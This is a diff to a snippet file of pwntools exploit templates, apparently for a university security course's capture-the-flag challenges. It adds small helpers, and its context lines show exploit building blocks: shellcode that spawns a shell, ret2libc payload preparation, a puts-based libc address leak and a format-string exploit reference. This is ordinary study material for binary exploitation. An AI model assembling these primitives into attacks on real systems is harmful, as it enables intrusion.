@@ -1,6 +1,13 @@
 snippet lj
 	${1:string}.ljust(${2:1337}, '${3:A}')
 
+snippet regex
+	rgx = re.compile('${0:N=(\d+)\s+C=(\d+)}')
+	match = rgx.match(${1:line})
+	if not match is None:
+		n = int(match.group(1))
+		c = int(match.group(2))
+
 ## PWNTOOLS ##
 
 snippet pimp "pwn imports"
@@ -18,7 +25,7 @@ snippet pwn "general pwntools template"
 	remoteflag = 0
 	IP = 'midsem.6447.sec.edu.au'
 	PORT = 8011
-	FILENAME = "${1:pwnme}"
+	FILENAME = "./${1:pwnme}"
 	if remoteflag:
 		io = remote(IP, PORT)
 	else:
@@ -38,6 +45,14 @@ snippet pwn "general pwntools template"
 	io.interactive()
 	#print io.recvall()
 
+snippet wrap "debugging function wrapper stolen from albntomat0"
+	#use by putting the @wrap decorator above any function
+	def wrap(f):
+		@wraps(f)
+		def wrapped_f(*args, **kwargs):
+			log.info('Called: ' + f.__name__ + repr(args))
+			return f(*args, **kwargs)
+		return wrapped_f
 snippet sc "shellcode payload"
 	shellcode = asm(shellcraft.${1:i386 | amd64}.linux.sh())
 
@@ -54,6 +69,11 @@ snippet sc3 "shellcode payload for 32 bit"
 
 snippet sc6 "shellcode payload for 64 bit"
 	shellcode = asm(shellcraft.amd64.linux.sh())
+
+snippet asm "because custom shellcode is sometimes necessary"
+	shellcode = asm("""
+							nop
+					""", arch='${1:i386 | amd64}')
 
 # inspired by my scv snippet
 snippet wtf "dump a string in various forms"
@@ -88,7 +108,7 @@ snippet ret2libc "prepping ret2libc payload fodder"
 	binsh = base + next(libc.search('/bin/sh\x00'))
 
 snippet putsleak "using puts to leak a libc address. main is default ret addr"
-	io.sendline(flat(cyclic(20), elf.sym.puts, ${0:elf.sym.main}, elf.got.printf))
+	putsleak = flat(elf.sym.puts, ${0:elf.sym.main}, elf.got.printf)
 
 # https://github.com/tnballo/notebook/wiki/Pwntools-Snippets#generate-a-format-string-exploit-for-arbitrary-write
 # Uses a linear search for the offset, so might not be great if the offset is very large, but otherwise this is M A G I C
@@ -213,6 +233,12 @@ snippet lx
 
 snippet snl
 	io.sendline(${0:payload})
+
+snippet recvloop "untested lol"
+	shitCount = ${0:8}
+	shits = [None for x in range(0, shitCount)] #maybe this line isn't necessary
+	for i,v in enumerate(shits):
+		shits[i] = io.recvline()
 
 snippet gdb
 	if not remoteflag:
